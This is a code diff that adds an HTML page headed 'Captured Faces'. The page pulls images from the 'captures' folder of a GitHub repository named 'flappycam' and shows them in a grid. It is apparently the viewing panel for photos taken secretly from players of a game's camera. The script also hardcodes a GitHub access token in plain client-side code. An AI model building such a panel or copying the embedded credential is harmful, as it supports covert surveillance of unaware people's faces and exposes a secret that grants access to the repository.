@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Viewer</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#0a0a0f;color:#fff;font-family:monospace;padding:20px;}
+h1{color:#00ffb4;margin-bottom:20px;font-size:20px;}
+#grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;}
+.card{background:#111;border-radius:8px;overflow:hidden;border:1px solid #222;}
+.card img{width:100%;height:200px;object-fit:cover;display:block;}
+.card p{padding:8px;font-size:11px;color:#aaa;}
+#status{color:#00ffb4;margin-bottom:16px;font-size:13px;}
+button{background:#00ffb4;color:#000;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-weight:bold;margin-bottom:16px;}
+</style>
+</head>
+<body>
+<h1>📷 Captured Faces</h1>
+<button onclick="load()">🔄 Refresh</button>
+<div id="status">Loading...</div>
+<div id="grid"></div>
+<script>
+const REPO='ARNOB01719/flappycam';
+const TOKEN='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';
+async function load(){
+  document.getElementById('status').textContent='Fetching...';
+  const res=await fetch(`https://api.github.com/repos/${REPO}/contents/captures`,{
+    headers:{'Authorization':`token ${TOKEN}`}
+  });
+  if(!res.ok){document.getElementById('status').textContent='No captures yet.';return;}
+  const files=await res.json();
+  document.getElementById('status').textContent=`${files.length} capture(s) found`;
+  const grid=document.getElementById('grid');
+  grid.innerHTML='';
+  files.reverse().forEach(f=>{
+    const card=document.createElement('div');
+    card.className='card';
+    card.innerHTML=`<img src="${f.download_url}" loading="lazy"><p>${f.name}</p>`;
+    grid.appendChild(card);
+  });
+}
+load();
+</script>
+</body>
+</html>
